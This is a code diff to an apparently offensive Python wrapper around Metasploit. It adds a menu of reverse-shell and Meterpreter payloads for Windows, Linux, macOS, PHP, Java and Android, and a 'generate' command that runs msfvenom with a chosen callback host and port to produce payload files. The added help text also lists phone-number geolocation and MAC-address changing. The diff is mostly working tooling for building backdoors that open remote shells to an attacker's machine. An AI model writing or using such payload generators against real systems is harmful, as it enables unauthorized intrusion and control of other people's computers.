@@ -121,6 +121,79 @@ default_ssl = ""
 
 banner()
 
+# Mapping of payloads to their default file extensions
+payload_extensions = {
+    'windows/x64/meterpreter/reverse_tcp': 'exe',
+    'windows/x64/meterpreter_reverse_tcp': 'exe',
+    'windows/x64/shell/reverse_tcp': 'exe',
+    'windows/x64/shell_reverse_tcp': 'exe',
+    'linux/x64/meterpreter/reverse_tcp': 'elf',
+    'linux/x64/shell_reverse_tcp': 'elf',
+    'osx/x64/meterpreter/reverse_tcp': 'macho',
+    'osx/x64/meterpreter_reverse_tcp': 'macho',
+    'osx/x64/shell_reverse_tcp': 'macho',
+    'php/meterpreter_reverse_tcp': 'php',
+    'php/reverse_php': 'php',
+    'java/jsp_shell_reverse_tcp': 'jsp',
+    'java/shell_reverse_tcp': 'war',
+    'android/meterpreter/reverse_tcp': 'apk',
+    'cmd/unix/reverse_python': 'py',
+    'cmd/unix/reverse_bash': 'sh',
+}
+
+def generate_payload():
+    global default_lhost, default_lport, default_payload
+    
+    # Display a menu of payloads
+    print()
+    print("Available payloads:")
+    for i, (payload_name, _) in enumerate(payload_extensions.items(), start=1):
+        print(f" {i}. {payload_name}")
+            
+    while True:
+        payload_choice = input(f"\nSelect a payload or press enter to use {default_payload}: ").strip()
+        if not payload_choice:
+            payload = default_payload
+            break
+        elif payload_choice.isdigit() and 1 <= int(payload_choice) <= len(payload_extensions):
+            payload = list(payload_extensions.keys())[int(payload_choice) - 1]
+            break
+        else:
+            print("Invalid selection. Please choose a valid number.")
+
+    # Prompt the user for input, allowing them to press Enter to keep the current value
+    lhost = input(f"Enter a new LHOST ({default_lhost}): ").strip() or default_lhost
+    lport = input(f"Enter a new LPORT ({default_lport}): ").strip() or default_lport
+
+    # Suggest the default file extension based on the payload
+    default_extension = payload_extensions.get(payload, 'bin')
+    filename = input(f"Enter filename (default extension: .{default_extension}): ").strip()
+    if not filename:
+        filename = f"payload.{default_extension}"
+    elif not os.path.splitext(filename)[1]:
+        # If the user did not provide an extension, use the default
+        filename += f".{default_extension}"
+
+    # Construct the msfvenom command
+    msfvenom_command = [
+        "msfvenom",
+        "-p", payload,
+        "LHOST={}".format(lhost),
+        "LPORT={}".format(lport),
+        "-f", os.path.splitext(filename)[1].lstrip('.'),
+        "-o", filename
+    ]
+
+    # Execute the msfvenom command
+    print(f"\nGenerating: {' '.join(msfvenom_command)}\n")
+    result = subprocess.run(msfvenom_command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
+
+    # Check if the payload was generated successfully
+    if result.returncode == 0:
+        print(f"[+] Payload generated successfully and saved to {filename}")
+    else:
+        print(f"[-] Failed to generate payload. Error: {result.stderr}")
+
 def send_metasploit_commands(master):
 
     commands = [
@@ -1317,6 +1390,7 @@ def main():
         inmodule = False
         modulepattern = r'\b(exploit|auxiliary|post|payload|encoder|nop|evasion)\((.*?)\)'
         ligoloup = False
+    with open("msf_log.txt", "a") as log_file:
         try:
             while True:
                 # Wait for data to become available on the master end of the PTY or stdin
@@ -1341,6 +1415,8 @@ def main():
 
                     elif r == sys.stdin:
                         user_input = sys.stdin.readline()
+                        log_file.write(user_input)
+                        log_file.flush()
                         if user_input.lower().strip() == "exit":
                             os.write(master, b"exit\n")
                             sys.exit()
@@ -1437,6 +1513,7 @@ def main():
                             print("  -bash *Enters a bash terminal. The script is still running. Use exit to return*")
                             print("  -chmac *Changes your MAC address. (Needs Root)*")
                             print("  -locate *full phone number* *sends a very approximate location for the provided phone number*")
+                            print("  -generate *generates a reverse shell utilizing msfvenom*")
                             print()
 
                             print("**NETWORK DISCOVERY COMMANDS:**")
@@ -1449,7 +1526,7 @@ def main():
                             print("  -spider *Crawls the HTML of a target website for interesting endpoints such as .js*")
                             print("  -dbust *Performs directory busting utilizing dirb to look for hidden directories on a target website.*")
                             print("  -fuzz *Utilizes ffuf to quickly enumerate endpoints on a target website.*")
-                            print("  -sbust *Performs quick subdomain busting utilizing Sublist3r to look for subdomains on a target website.*\n ")
+                            print("  -sbust *Performs quick subdomain busting utilizing Sublist3r to look for subdomains on a target website.*")
                             print("  -sbrute *Performs subdomain busting utilizing subbrute with a wordlist to look for subdomains on a target website.*")
                             print()
 
@@ -1481,6 +1558,13 @@ def main():
                         elif user_input.lower().startswith("clear "):
                             try:
                                 os.system('clear')
+                            except Exception as e:
+                                print(f"[-] Error occurred during scan: {e}")
+                                
+                        # If user enters the 'locate' command, geolocate a phone number
+                        elif user_input.lower().startswith("generate"):
+                            try:
+                                generate_payload()
                             except Exception as e:
                                 print(f"[-] Error occurred during scan: {e}")
 
